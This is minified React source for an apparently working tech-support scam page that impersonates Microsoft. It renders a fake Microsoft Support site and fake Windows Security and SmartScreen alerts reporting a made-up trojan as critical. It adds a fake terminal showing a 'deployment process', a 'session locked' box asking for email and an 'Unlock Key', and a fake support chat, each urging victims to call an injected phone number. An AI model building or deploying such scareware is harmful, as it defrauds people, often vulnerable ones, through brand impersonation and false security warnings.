        d: "M22.838,43.45c0.733,0.362,1.592,0.362,2.325,0C41.359,35.459,40.999,22,40.999,22V12 c0-1.105,0-1,0-1s-5.194-0.5-7.555-2S27.778,6,24,6s-7.083,1.5-9.444,3s-7.555,2-7.555,2s0-0.105,0,1v10 C7.001,22,6.641,35.459,22.838,43.45z",
      }),
      s.jsx("rect", {
        width: "2",
        height: "43",
        x: "23",
        y: "2",
        fill: "#fff",
      }),
      s.jsx("rect", { width: "48", height: "2", y: "23", fill: "#fff" }),
    ],
  });
}
function sy() {
  return s.jsxs("div", {
    style: {
      position: "absolute",
      inset: 0,
      background: "#fff",
      display: "flex",
      flexDirection: "column",
      fontFamily: "'Segoe UI', sans-serif",
      overflow: "hidden",
    },
    children: [
      s.jsxs("div", {
        style: {
          width: "100%",
          background: "#fff",
          borderBottom: "1px solid #e5e7eb",
          padding: "8px 16px",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          fontSize: 13,
          color: "#374151",
          boxSizing: "border-box",
        },
        children: [
          s.jsxs("div", {
            style: { display: "flex", alignItems: "center", gap: 24 },
            children: [
              s.jsxs("div", {
                style: {
                  display: "flex",
                  alignItems: "center",
                  gap: 8,
                  marginRight: 8,
                },
                children: [
                  s.jsxs("svg", {
                    width: "20",
                    height: "20",
                    viewBox: "0 0 21 21",
                    fill: "none",
                    children: [
                      s.jsx("rect", {
                        x: "1",
                        y: "1",
                        width: "9",
                        height: "9",
                        fill: "#f25022",
                      }),
                      s.jsx("rect", {
                        x: "11",
                        y: "1",
                        width: "9",
                        height: "9",
                        fill: "#7fba00",
                      }),
                      s.jsx("rect", {
                        x: "1",
                        y: "11",
                        width: "9",
                        height: "9",
                        fill: "#00a4ef",
                      }),
                      s.jsx("rect", {
                        x: "11",
                        y: "11",
                        width: "9",
                        height: "9",
                        fill: "#ffb900",
                      }),
                    ],
                  }),
                  s.jsx("div", {
                    style: {
                      height: 24,
                      width: 1,
                      background: "#d1d5db",
                      margin: "0 8px",
                    },
                  }),
                  s.jsx("span", {
                    style: { fontWeight: 600, fontSize: 15 },
                    children: "Support",
                  }),
                ],
              }),
              s.jsxs("div", {
                style: {
                  display: "flex",
                  alignItems: "center",
                  gap: 16,
                  opacity: 0.8,
                },
                children: [
                  ["Microsoft 365", "Office", "Products"].map((E) =>
                    s.jsx(
                      "span",
                      { style: { cursor: "pointer" }, children: E },
                      E
                    )
                  ),
                  s.jsxs("span", {
                    style: {
                      display: "flex",
                      alignItems: "center",
                      gap: 4,
                      cursor: "pointer",
                    },
                    children: [
                      "Devices ",
                      s.jsx("svg", {
                        style: { width: 8, height: 8 },
                        fill: "none",
                        stroke: "currentColor",
                        viewBox: "0 0 24 24",
                        children: s.jsx("path", {
                          strokeLinecap: "round",
                          strokeLinejoin: "round",
                          strokeWidth: "2",
                          d: "M19 9l-7 7-7-7",
                        }),
                      }),
                    ],
                  }),
                  s.jsxs("span", {
                    style: {
                      display: "flex",
                      alignItems: "center",
                      gap: 4,
                      cursor: "pointer",
                    },
                    children: [
                      "Account & billing ",
                      s.jsx("svg", {
                        style: { width: 8, height: 8 },
                        fill: "none",
                        stroke: "currentColor",
                        viewBox: "0 0 24 24",
                        children: s.jsx("path", {
                          strokeLinecap: "round",
                          strokeLinejoin: "round",
                          strokeWidth: "2",
                          d: "M19 9l-7 7-7-7",
                        }),
                      }),
                    ],
                  }),
                  s.jsxs("span", {
                    style: {
                      display: "flex",
                      alignItems: "center",
                      gap: 4,
                      cursor: "pointer",
                    },
                    children: [
                      "Resources ",
                      s.jsx("svg", {
                        style: { width: 8, height: 8 },
                        fill: "none",
                        stroke: "currentColor",
                        viewBox: "0 0 24 24",
                        children: s.jsx("path", {
                          strokeLinecap: "round",
                          strokeLinejoin: "round",
                          strokeWidth: "2",
                          d: "M19 9l-7 7-7-7",
                        }),
                      }),
                    ],
                  }),
                ],
              }),
            ],
          }),
          s.jsxs("div", {
            style: { display: "flex", alignItems: "center", gap: 24 },
            children: [
              s.jsx("div", {
                style: {
                  background: "#f3f4f6",
                  padding: "4px 12px",
                  borderRadius: 4,
                  fontSize: 12,
                  border: "1px solid #e5e7eb",
                  cursor: "not-allowed",
                },
                children: "Try Copilot Chat",
              }),
              s.jsxs("div", {
                style: {
                  display: "flex",
                  alignItems: "center",
                  gap: 16,
                  opacity: 0.8,
                },
                children: [
                  s.jsx("span", { children: "All Microsoft" }),
                  s.jsx("span", {
                    style: { display: "flex", alignItems: "center", gap: 4 },
                    children: "Search 🔍",
                  }),
                  s.jsx("span", {
                    style: { display: "flex", alignItems: "center", gap: 4 },
                    children: "Sign in 👤",
                  }),
                ],
              }),
            ],
          }),
        ],
      }),
      s.jsxs("div", {
        style: {
          width: "100%",
          background: "#f3f3f3",
          padding: "64px 10vw 80px",
          textAlign: "center",
          borderBottom: "1px solid #e5e7eb",
          boxSizing: "border-box",
        },
        children: [
          s.jsx("h1", {
            style: {
              fontSize: 42,
              fontWeight: 300,
              color: "#1f2937",
              marginBottom: 32,
            },
            children: "Welcome to Microsoft Support",
          }),
          s.jsxs("div", {
            style: { maxWidth: 768, margin: "0 auto", position: "relative" },
            children: [
              s.jsx("input", {
                type: "text",
                placeholder: "How can we help you?",
                style: {
                  width: "100%",
                  paddingLeft: 48,
                  paddingRight: 16,
                  paddingTop: 16,
                  paddingBottom: 16,
                  borderRadius: 2,
                  border: "1px solid #0078d4",
                  boxShadow: "0 4px 6px rgba(0,0,0,0.07)",
                  outline: "none",
                  fontSize: 18,
                  fontWeight: 300,
                  boxSizing: "border-box",
                },
                disabled: !0,
              }),
              s.jsx("div", {
                style: {
                  position: "absolute",
                  left: 16,
                  top: "50%",
                  transform: "translateY(-50%)",
                  color: "#9ca3af",
                },
                children: "🔍",
              }),
            ],
          }),
        ],
      }),
      s.jsx("div", {
        style: {
          flex: 1,
          padding: "64px 10vw",
          display: "grid",
          gridTemplateColumns: "1fr 1fr 1fr 1fr",
          gap: 32,
          background: "#fff",
          opacity: 0.4,
          boxSizing: "border-box",
        },
        children: [
          {
            title: "Microsoft 365",
            links: [
              "Install Microsoft 365",
              "Sign in to Microsoft 365",
              "Manage payments and billing",
            ],
          },
          {
            title: "Storage & Microsoft account",
            links: [
              "Sign in procedure for your Microsoft account",
              "Change your Microsoft account password",
              "How does Microsoft storage work?",
            ],
          },
          {
            title: "Activation",
            links: [
              "Activate Office",
              "Activate Windows",
              "Find your Windows product key",
            ],
          },
          {
            title: "Windows and devices",
            links: [
              "Update required for Windows 11",
              "Supported Windows 10 devices",
              "Find your hardware warranty",
            ],
          },
        ].map((E) =>
          s.jsxs(
            "div",
            {
              children: [
                s.jsx("h3", {
                  style: { fontWeight: 600, fontSize: 18, marginBottom: 24 },
                  children: E.title,
                }),
                s.jsx("ul", {
                  style: { listStyle: "none", padding: 0, margin: 0 },
                  children: E.links.map((H) =>
                    s.jsx(
                      "li",
                      {
                        style: {
                          fontSize: 14,
                          color: "#0078d4",
                          marginBottom: 16,
                          cursor: "pointer",
                        },
                        children: H,
                      },
                      H
                    )
                  ),
                }),
              ],
            },
            E.title
          )
        ),
      }),
      s.jsx("div", {
        style: {
          padding: "80px 0",
          textAlign: "center",
          background: "#f9fafb",
          borderTop: "1px solid #f3f4f6",
          opacity: 0.3,
        },
        children: s.jsx("h2", {
          style: { fontSize: 36, fontWeight: 300, color: "#1f2937" },
          children: "Discover",
        }),
      }),
    ],
  });
}
function oy({ style: E }) {
  const [H, G] = bl.useState([]),
    v = bl.useRef(null);
  return (
    bl.useEffect(() => {
      let O = 0;
      const V = setInterval(() => {
        G((sl) => [...sl, E0[O % E0.length]].slice(-25)), O++;
      }, 100);
      return () => clearInterval(V);
    }, []),
    bl.useEffect(() => {
      v.current && (v.current.scrollTop = v.current.scrollHeight);
    }, [H]),
    s.jsxs("div", {
      style: {
        position: "absolute",
        width: 500,
        height: 350,
        background: "#000",
        border: "1px solid #4b5563",
        borderRadius: 6,
        boxShadow: "0 25px 50px rgba(0,0,0,0.5)",
        zIndex: 4500,
        fontFamily: "monospace",
        padding: 16,
        overflow: "hidden",
        display: "flex",
        flexDirection: "column",
        boxSizing: "border-box",
        ...E,
      },
      children: [
        s.jsxs("div", {
          style: {
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
            borderBottom: "1px solid #374151",
            paddingBottom: 4,
            marginBottom: 8,
          },
          children: [
            s.jsx("div", {
              style: { fontSize: 10, color: "#9ca3af" },
              children: "Trojan:Win32/Hive.ZY Deployment Process",
            }),
            s.jsxs("div", {
              style: { display: "flex", gap: 6, opacity: 0.5 },
              children: [
                s.jsx("div", {
                  style: {
                    width: 8,
                    height: 8,
                    borderRadius: "50%",
                    background: "#4b5563",
                  },
                }),
                s.jsx("div", {
                  style: {
                    width: 8,
                    height: 8,
                    borderRadius: "50%",
                    background: "#4b5563",
                  },
                }),
                s.jsx("div", {
                  style: {
                    width: 8,
                    height: 8,
                    borderRadius: "50%",
                    background: "#4b5563",
                  },
                }),
              ],
            }),
          ],
        }),
        s.jsxs("div", {
          ref: v,
          style: {
            flex: 1,
            overflowY: "auto",
            color: "#22c55e",
            fontSize: 11,
            lineHeight: 1.4,
          },
          children: [
            H.map((O, V) => s.jsx("div", { children: O }, V)),
            s.jsx("div", {
              style: { animation: "blink 1s step-end infinite" },
              children: "_",
            }),
          ],
        }),
      ],
    })
  );
}
function dy({ style: E }) {
  return s.jsxs("div", {
    style: {
      position: "absolute",
      width: 700,
      background: "#fff",
      borderRadius: 2,
      boxShadow: "0 10px 50px rgba(0,0,0,0.4)",
      overflow: "hidden",
      fontFamily: "'Segoe UI', sans-serif",
      zIndex: 5005,
      ...E,
    },
    children: [
      s.jsxs("div", {
        style: {
          padding: "8px 16px",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          background: "#fff",
          borderBottom: "1px solid #f3f4f6",
        },
        children: [
          s.jsxs("div", {
            style: { display: "flex", alignItems: "center", gap: 8 },
            children: [
              s.jsx(j0, { width: 16, height: 16 }),
              s.jsx("span", {
                style: { fontSize: 12, color: "#374151" },
                children: "Windows Security",
              }),
            ],
          }),
          s.jsxs("div", {
            style: { display: "flex", gap: 16, color: "#9ca3af", fontSize: 18 },
            children: [
              s.jsx("span", { children: "_" }),
              s.jsx("span", { children: "□" }),
              s.jsx("span", { style: { fontSize: 20 }, children: "×" }),
            ],
          }),
        ],
      }),
      s.jsxs("div", {
        style: { padding: 40 },
        children: [
          s.jsxs("div", {
            style: {
              display: "flex",
              gap: 32,
              alignItems: "flex-start",
              marginBottom: 32,
            },
            children: [
              s.jsx("div", {
                style: {
                  flexShrink: 0,
                  width: 64,
                  height: 64,
                  background: "#0078d4",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: "#fff",
                },
                children: s.jsxs("svg", {
                  xmlns: "http://www.w3.org/2000/svg",
                  width: "40",
                  height: "40",
                  viewBox: "0 0 48 48",
                  children: [
                    s.jsx("path", {
                      fill: "#fff",
                      d: "M22.838,43.45c0.733,0.362,1.592,0.362,2.325,0C41.359,35.459,40.999,22,40.999,22V12 c0-1.105,0-1,0-1s-5.194-0.5-7.555-2S27.778,6,24,6s-7.083,1.5-9.444,3s-7.555,2-7.555,2s0-0.105,0,1v10 C7.001,22,6.641,35.459,22.838,43.45z",
                    }),
                    s.jsx("rect", {
                      width: "2",
                      height: "43",
                      x: "23",
                      y: "2",
                      fill: "#0078d4",
                    }),
                    s.jsx("rect", {
                      width: "48",
                      height: "2",
                      y: "23",
                      fill: "#0078d4",
                    }),
                  ],
                }),
              }),
              s.jsxs("div", {
                children: [
                  s.jsx("h2", {
                    style: {
                      fontSize: 28,
                      fontWeight: 300,
                      color: "#d83b01",
                      marginBottom: 4,
                    },
                    children: "Threat Trojan:Win32/Hive.ZY",
                  }),
                  s.jsx("p", {
                    style: {
                      fontSize: 14,
                      color: "#6b7280",
                      fontStyle: "italic",
                    },
                    children: "Critical analysis in progress...",
                  }),
                ],
              }),
            ],
          }),
          s.jsx("div", {
            style: {
              width: "100%",
              height: 4,
              background: "#f3f4f6",
              marginBottom: 32,
              position: "relative",
              overflow: "hidden",
            },
            children: s.jsx("div", {
              style: {
                position: "absolute",
                inset: 0,
                background: "#ef4444",
                animation: "scanProgress 2s ease-in-out infinite",
                width: "40%",
              },
            }),
          }),
          s.jsx("div", {
            style: {
              display: "grid",
              gridTemplateColumns: "1fr 1fr 1fr",
              borderTop: "1px solid #f3f4f6",
              borderBottom: "1px solid #f3f4f6",
              marginBottom: 32,
            },
            children: [
              { label: "Files Scanned", value: "52,874", color: "#1f2937" },
              { label: "Threats Detected", value: "6", color: "#dc2626" },
              {
                label: "Status",
                value: "CRITICAL",
                color: "#d83b01",
                pulse: !0,
              },
            ].map((H, G) =>
              s.jsxs(
                "div",
                {
                  style: {
                    padding: "24px 0",
                    textAlign: "center",
                    borderRight: G < 2 ? "1px solid #f3f4f6" : "none",
                  },
                  children: [
                    s.jsx("p", {
                      style: {
                        fontSize: 14,
                        color: "#9ca3af",
                        fontWeight: 600,
                        letterSpacing: 1,
                        marginBottom: 4,
                        textTransform: "uppercase",
                      },
                      children: H.label,
                    }),
                    s.jsx("p", {
                      style: {
                        fontSize: 24,
                        fontWeight: 700,
                        color: H.color,
                        animation: H.pulse ? "pulse 2s infinite" : "none",
                      },
                      children: H.value,
                    }),
                  ],
                },
                G
              )
            ),
          }),
          s.jsx("div", {
            style: { display: "flex", justifyContent: "flex-end" },
            children: s.jsx("button", {
              style: {
                padding: "10px 48px",
                background: "#e1e1e1",
                border: "none",
                borderRadius: 4,
                fontSize: 14,
                color: "#6b7280",
                fontWeight: 600,
                cursor: "not-allowed",
              },
              children: "Clean (Unavailable)",
            }),
          }),
        ],
      }),
    ],
  });
}
function ry({ style: E, phone: H }) {
  return s.jsxs("div", {
    style: {
      position: "absolute",
      width: 450,
      background: "#fff",
      borderRadius: 4,
      boxShadow: "0 25px 50px rgba(0,0,0,0.25)",
      animation: "fadeIn 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards",
      overflow: "hidden",
      fontFamily: "'Segoe UI', sans-serif",
      zIndex: 5e3,
      ...E,
    },
    children: [
      s.jsxs("div", {
        style: {
          background: "#0078d4",
          color: "#fff",
          padding: 24,
          textAlign: "center",
          position: "relative",
        },
        children: [
          s.jsx("div", {
            style: {
              position: "absolute",
              top: 16,
              right: 16,
              color: "rgba(255,255,255,0.8)",
              cursor: "pointer",
              fontSize: 20,
            },
            children: "×",
          }),
          s.jsx("h2", {
            style: { fontSize: 24, fontWeight: 600, marginBottom: 8 },
            children: "Authentication Required",
          }),
          s.jsx("p", {
            style: { fontSize: 14, opacity: 0.9 },
            children: "Windows Firewall has locked your session.",
          }),
          s.jsx("div", {
            style: {
              fontSize: 30,
              fontWeight: 700,
              marginTop: 16,
              letterSpacing: 2,
              color: "#fbbf24",
            },
            children: H,
          }),
        ],
      }),
      s.jsxs("div", {
        style: { padding: 32, background: "#f3f3f3" },
        children: [
          s.jsx("div", {
            style: { marginBottom: 16 },
            children: s.jsx("input", {
              type: "text",
              placeholder: "Email",
              style: {
                width: "100%",
                padding: 12,
                border: "1px solid #d1d5db",
                borderRadius: 4,
                background: "#fff",
                color: "#000",
                outline: "none",
                fontSize: 14,
                boxSizing: "border-box",
              },
              disabled: !0,
            }),
          }),
          s.jsx("div", {
            style: { marginBottom: 16 },
            children: s.jsx("input", {
              type: "password",
              placeholder: "Unlock Key",
              style: {
                width: "100%",
                padding: 12,
                border: "1px solid #d1d5db",
                borderRadius: 4,
                background: "#fff",
                color: "#000",
                outline: "none",
                fontSize: 14,
                boxSizing: "border-box",
              },
              disabled: !0,
            }),
          }),
          s.jsx("button", {
            style: {
              width: "100%",
              padding: 12,
              background: "#0078d4",
              border: "none",
              borderRadius: 4,
              color: "#fff",
              fontWeight: 700,
              fontSize: 14,
              cursor: "pointer",
              letterSpacing: 1,
              textTransform: "uppercase",
            },
            children: "Unlock My PC",
          }),
        ],
      }),
    ],
  });
}
function yy({ style: E, phone: H }) {
  return s.jsxs("div", {
    style: {
      position: "absolute",
      width: 600,
      background: "#fff",
      borderRadius: 4,
      boxShadow: "0 25px 50px rgba(0,0,0,0.25)",
      animation: "fadeIn 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards",
      overflow: "hidden",
      fontFamily: "'Segoe UI', sans-serif",
      zIndex: 5001,
      ...E,
    },
    children: [
      s.jsxs("div", {
        style: {
          background: "#f3f3f3",
          padding: "8px 16px",
          display: "flex",
          alignItems: "center",
          gap: 8,
          borderBottom: "1px solid #e5e7eb",
        },
        children: [
          s.jsx(j0, { width: 20, height: 20 }),
          s.jsx("span", {
            style: { fontSize: 14, fontWeight: 600, color: "#374151" },
            children: "Windows Security - Action Required",
          }),
        ],
      }),
      s.jsxs("div", {
        style: { padding: 32 },
        children: [
          s.jsx("h2", {
            style: {
              fontSize: 24,
              fontWeight: 300,
              color: "#0078d4",
              marginBottom: 24,
              lineHeight: 1.3,
            },
            children: "Access to this PC has been temporarily suspended",
          }),
          s.jsx("p", {
            style: {
              fontSize: 14,
              color: "#4b5563",
              lineHeight: 1.6,
              marginBottom: 24,
            },
            children:
              "For your security, Windows has blocked the execution of unauthorized scripts detected on this network. A manual verification by a certified Microsoft technician is necessary to unlock the system.",
          }),
          s.jsxs("div", {
            style: {
              background: "#f9f9f9",
              padding: 20,
              borderRadius: 4,
              border: "1px solid #f3f4f6",
              fontFamily: "Consolas, monospace",
              fontSize: 12,
              lineHeight: 2,
              marginBottom: 32,
            },
            children: [
              s.jsxs("p", {
                children: [
                  s.jsx("span", {
                    style: { color: "#6b7280" },
                    children: "Session ID:",
                  }),
                  " 899-XC-22-B",
                ],
              }),
              s.jsxs("p", {
                children: [
                  s.jsx("span", {
                    style: { color: "#6b7280" },
                    children: "IP Address:",
                  }),
                  " 172.217.14.206 (United States)",
                ],
              }),
              s.jsxs("p", {
                children: [
                  s.jsx("span", {
                    style: { color: "#6b7280" },
                    children: "Error code:",
                  }),
                  " 0x80070422 (Firewall_Block)",
                ],
              }),
            ],
          }),
          s.jsx("div", {
            style: {
              display: "grid",
              gridTemplateColumns: "1fr 1fr",
              gap: "16px 20px",
              marginBottom: 32,
              fontSize: 13,
            },
            children: [
              "Banking Services",
              "Email",
              "System Files",
              "Network Connection",
            ].map((G) =>
              s.jsxs(
                "div",
                {
                  style: {
                    display: "flex",
                    alignItems: "center",
                    gap: 12,
                    color: "#374151",
                  },
                  children: [
                    s.jsx("span", {
                      style: { color: "#f59e0b" },
                      children: "⚠",
                    }),
                    " ",
                    G,
                  ],
                },
                G
              )
            ),
          }),
          s.jsxs("div", {
            style: {
              textAlign: "center",
              background: "rgba(219,234,254,0.5)",
              padding: 24,
              borderRadius: 8,
              marginBottom: 16,
            },
            children: [
              s.jsx("p", {
                style: { fontSize: 14, color: "#6b7280", marginBottom: 8 },
                children: "Technical Support (Free - 24/7):",
              }),
              s.jsx("p", {
                style: {
                  fontSize: 36,
                  fontWeight: 700,
                  color: "#0078d4",
                  letterSpacing: 2,
                  marginBottom: 8,
                },
                children: H,
              }),
              s.jsx("p", {
                style: { fontSize: 10, color: "#9ca3af" },
                children: "Reference number: #WIN-8842",
              }),
            ],
          }),
          s.jsxs("div", {
            style: {
              display: "flex",
              gap: 12,
              justifyContent: "flex-end",
              paddingTop: 16,
              borderTop: "1px solid #f3f4f6",
            },
            children: [
              s.jsx("button", {
                style: {
                  padding: "8px 32px",
                  border: "1px solid #d1d5db",
                  borderRadius: 4,
                  fontSize: 14,
                  cursor: "pointer",
                  background: "#fff",
                },
                children: "Cancel",
              }),
              s.jsx("button", {
                style: {
                  padding: "8px 32px",
                  background: "#0078d4",
                  border: "none",
                  borderRadius: 4,
                  fontSize: 14,
                  color: "#fff",
                  fontWeight: 600,
                  cursor: "pointer",
                },
                children: "Contact support",
              }),
            ],
          }),
        ],
      }),
    ],
  });
}
function hy({ style: E, phone: H }) {
  return s.jsxs("div", {
    style: {
      position: "absolute",
      width: 440,
      background: "#0067b8",
      color: "#fff",
      borderRadius: 2,
      boxShadow: "0 25px 50px rgba(0,0,0,0.25)",
      fontFamily: "'Segoe UI', sans-serif",
      padding: 32,
      border: "1px solid rgba(255,255,255,0.1)",
      animation: "fadeIn 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards",
      zIndex: 8500,
      pointerEvents: "auto",
      ...E,
    },
    children: [
      s.jsx("h2", {
        style: { fontSize: 24, fontWeight: 600, marginBottom: 24 },
        children: "SmartScreen - Preventive Block",
      }),
      s.jsxs("div", {
        style: { display: "flex", flexDirection: "column", gap: 24 },
        children: [
          s.jsx("h3", {
            style: { fontSize: 18, fontWeight: 700, lineHeight: 1.3 },
            children: "Windows has stopped execution to protect your data.",
          }),
          s.jsx("ul", {
            style: {
              listStyle: "none",
              padding: 0,
              margin: 0,
              display: "flex",
              flexDirection: "column",
              gap: 8,
              fontSize: 15,
              opacity: 0.95,
              marginLeft: 8,
            },
            children: [
              "Trojan Horse (Trojan.Spy.Win32)",
              "Identity theft attempt (Yahoo, Microsoft, Banking)",
              "Critical System Error",
            ].map((G, v) =>
              s.jsxs(
                "li",
                {
                  style: { display: "flex", alignItems: "flex-start", gap: 12 },
                  children: [
                    s.jsx("span", {
                      style: {
                        marginTop: 6,
                        width: 6,
                        height: 6,
                        background: "#fff",
                        borderRadius: "50%",
                        flexShrink: 0,
                        display: "inline-block",
                      },
                    }),
                    G,
                  ],
                },
                v
              )
            ),
          }),
          s.jsx("div", {
            style: {
              background: "#fff",
              padding: "16px 8px",
              borderRadius: 2,
              textAlign: "center",
            },
            children: s.jsxs("p", {
              style: {
                color: "#0067b8",
                fontSize: 24,
                fontWeight: 700,
                letterSpacing: 1,
              },
              children: ["Call ", H],
            }),
          }),
          s.jsx("button", {
            style: {
              width: "100%",
              padding: "10px 0",
              border: "2px solid rgba(255,255,255,0.8)",
              borderRadius: 2,
              fontSize: 18,
              fontWeight: 600,
              background: "transparent",
              color: "#fff",
              cursor: "pointer",
            },
            children: "Ignore (Risky)",
          }),
        ],
      }),
    ],
  });
}
function vy({ pos: E }) {
  return s.jsx("div", {
    style: {
      position: "fixed",
      left: E.x,
      top: E.y,
      pointerEvents: "none",
      zIndex: 99999,
      transition: "none",
    },
    children: s.jsx("svg", {
      width: "24",
      height: "24",
      viewBox: "0 0 24 24",
      fill: "none",
      xmlns: "http://www.w3.org/2000/svg",
      children: s.jsx("path", {
        d: "M5.5 3.21V20.8L10.51 15.79L12.51 20.6L15.34 19.41L13.34 14.61L20.2 14.61L5.5 3.21Z",
        fill: "white",
        stroke: "black",
        strokeWidth: "2",
        strokeLinejoin: "round",
      }),
    }),
  });
}
function my({ phone: E }) {
  return s.jsxs("div", {
    style: {
      position: "absolute",
      bottom: 20,
      right: 20,
      width: 320,
      background: "#fff",
      borderRadius: "8px 8px 0 0",
      boxShadow: "0 25px 50px rgba(0,0,0,0.25)",
      zIndex: 1e4,
      overflow: "hidden",
      display: "flex",
      flexDirection: "column",
      fontFamily: "'Segoe UI', sans-serif",
    },
    children: [
      s.jsxs("div", {
        style: {
          background: "#0078d4",
          color: "#fff",
          padding: 12,
          display: "flex",
          alignItems: "center",
          gap: 12,
        },
        children: [
          s.jsx("div", {
            style: {
              width: 40,
              height: 40,
              background: "#fff",
              color: "#0078d4",
              borderRadius: "50%",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              fontWeight: 700,
              fontSize: 14,
              boxShadow: "inset 0 2px 4px rgba(0,0,0,0.1)",
            },
            children: "MS",
          }),
          s.jsxs("div", {
            style: { flex: 1 },
            children: [
              s.jsx("div", {
                style: { fontWeight: 700, fontSize: 14, lineHeight: 1.2 },
                children: "Microsoft Support",
              }),
              s.jsxs("div", {
                style: {
                  display: "flex",
                  alignItems: "center",
                  gap: 6,
                  marginTop: 2,
                },
                children: [
                  s.jsx("span", {
                    style: {
                      width: 8,
                      height: 8,
                      background: "#4ade80",
                      borderRadius: "50%",
                      display: "inline-block",
                      animation: "pulse 2s infinite",
                    },
                  }),
                  s.jsx("span", {
                    style: { fontSize: 10, opacity: 0.9 },
                    children: "Online",
                  }),
                ],
              }),
            ],
          }),
          s.jsxs("div", {
            style: {
              fontSize: 18,
              opacity: 0.8,
              cursor: "default",
              display: "flex",
              alignItems: "center",
              gap: 8,
            },
            children: [
              s.jsx("span", { children: "_" }),
              s.jsx("span", { children: "□" }),
              s.jsx("span", { style: { fontSize: 20 }, children: "×" }),
            ],
          }),
        ],
      }),
      s.jsxs("div", {
        style: {
          height: 400,
          padding: 16,
          overflowY: "auto",
          display: "flex",
          flexDirection: "column",
          gap: 12,
          background: "#f3f3f3",
        },
        children: [
          fy.map((H) => {
            const G = H.text.replace("PHONE_PLACEHOLDER", E);
            return H.type === "timestamp"
              ? s.jsx(
                  "div",
                  {
                    style: { textAlign: "center", margin: "4px 0" },
                    children: s.jsx("span", {
                      style: {
                        background: "#e5e7eb",
                        color: "#6b7280",
                        padding: "4px 12px",
                        borderRadius: 9999,
                        fontSize: 10,
                        textTransform: "uppercase",
                        fontWeight: 600,
                        letterSpacing: 0.5,
                      },
                      children: H.text,
                    }),
                  },
                  H.id
                )
              : H.type === "system"
              ? s.jsx(
                  "div",
                  {
                    style: { textAlign: "center", margin: "4px 0" },
                    children: s.jsx("span", {
                      style: {
                        background: "#e5e7eb",
                        color: "#6b7280",
                        padding: "4px 12px",
                        borderRadius: 9999,
                        fontSize: 10,
                        fontWeight: 500,
                        fontStyle: "italic",
                        opacity: 0.8,
                      },
                      children: H.text,
                    }),
                  },
                  H.id
                )
              : s.jsxs(
                  "div",
                  {
                    style: {
                      padding: "10px 16px",
                      borderRadius: 16,
                      fontSize: 12,
                      lineHeight: 1.4,
                      maxWidth: "85%",
                      boxShadow: "0 1px 2px rgba(0,0,0,0.05)",
                      background: "#fff",
                      color: "#1f2937",
                      alignSelf: "flex-start",
                      borderBottomLeftRadius: 4,
                      border: "1px solid #f3f4f6",
                    },
                    children: [
                      G,
                      s.jsx("div", {
                        style: {
                          fontSize: 9,
                          opacity: 0.4,
                          marginTop: 4,
                          textAlign: "right",
                        },
                        children: "02:53 PM",
                      }),
                    ],
                  },
                  H.id
                );
          }),
          s.jsxs("div", {
            style: { marginTop: 8, textAlign: "center" },
            children: [
              s.jsx("div", {
                style: {
                  color: "#dc2626",
                  fontWeight: 700,
                  fontSize: 10,
                  textTransform: "uppercase",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 4,
                },
                children: "⚠ Session blocked for your security",
              }),
              s.jsx("div", {
                style: {
                  fontSize: 24,
                  fontWeight: 700,
                  color: "#1f2937",
                  margin: "8px 0",
                },
                children: E,
              }),
              s.jsxs("button", {
                style: {
                  width: "100%",
                  background: "#0078d4",
                  color: "#fff",
                  padding: "8px 0",
                  borderRadius: 8,
                  fontSize: 12,
                  fontWeight: 700,
                  border: "none",
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 8,
                },
                children: [
                  s.jsx("span", { children: "📞" }),
                  " Contact Support",
                ],
              }),
            ],
          }),
        ],
      }),
      s.jsxs("div", {
        style: {
          padding: 12,
          borderTop: "1px solid #e5e7eb",
          display: "flex",
          gap: 8,
          background: "#fff",
        },
        children: [
          s.jsx("input", {
            type: "text",
            placeholder: "Type your message...",
            style: {
              flex: 1,
              border: "1px solid #e5e7eb",
              borderRadius: 8,
              padding: "8px 12px",
              fontSize: 12,
              outline: "none",
              background: "#f9fafb",
              cursor: "not-allowed",
            },
            disabled: !0,
          }),
          s.jsx("button", {
            style: {
              background: "#0078d4",
              color: "#fff",
              padding: 8,
              borderRadius: 8,
              border: "none",
              cursor: "not-allowed",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
            },
            disabled: !0,
            children: s.jsx("svg", {
              style: { width: 16, height: 16, transform: "rotate(90deg)" },
              fill: "currentColor",
              viewBox: "0 0 24 24",
              children: s.jsx("path", {
                d: "M2.01 21L23 12 2.01 3 2 10l15 2-15 2z",
              }),
            }),
          }),
        ],
      }),
    ],
  });
}
function gy({ popup: E, onClose: H }) {
  return s.jsxs("div", {
    style: {
      position: "absolute",
      top: E.style.top,
      left: E.style.left,
      width: 380,
      background: "#fff",
      border: "1px solid #d1d1d1",
      boxShadow: "0 4px 24px rgba(0,0,0,0.15)",
      zIndex: 8e3,
      fontFamily: "'Segoe UI', sans-serif",
      overflow: "hidden",
      pointerEvents: "auto",
    },
    children: [
      s.jsxs("div", {
        style: {
          background: "#fff",
          padding: "6px 12px",
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          fontSize: 11,
          color: "#4b5563",
          borderBottom: "1px solid #f3f4f6",
        },
        children: [
          s.jsx("div", {
            style: { display: "flex", alignItems: "center", gap: 8 },
            children: E.title,
          }),
          s.jsx("div", {
            style: {
              color: "#9ca3af",
              cursor: "pointer",
              fontSize: 18,
              lineHeight: 1,
            },
            onClick: () => H(E.id),
            children: "×",
          }),
        ],
      }),
      s.jsxs("div", {
        style: { padding: 24, display: "flex", gap: 24, alignItems: "center" },
        children: [
          s.jsxs("div", {
            style: { flexShrink: 0 },
            children: [
              E.type === "error" &&
                s.jsx("div", {
                  style: { width: 36, height: 36, color: "#ef4444" },
                  children: s.jsxs("svg", {
                    viewBox: "0 0 24 24",
                    fill: "none",
                    stroke: "currentColor",
                    strokeWidth: "2.5",
                    strokeLinecap: "round",
                    strokeLinejoin: "round",
                    children: [
                      s.jsx("circle", { cx: "12", cy: "12", r: "10" }),
                      s.jsx("line", {
                        x1: "4.93",
                        y1: "4.93",
                        x2: "19.07",
                        y2: "19.07",
                      }),
                    ],
                  }),
                }),
              E.type === "security" &&
                s.jsx("div", {
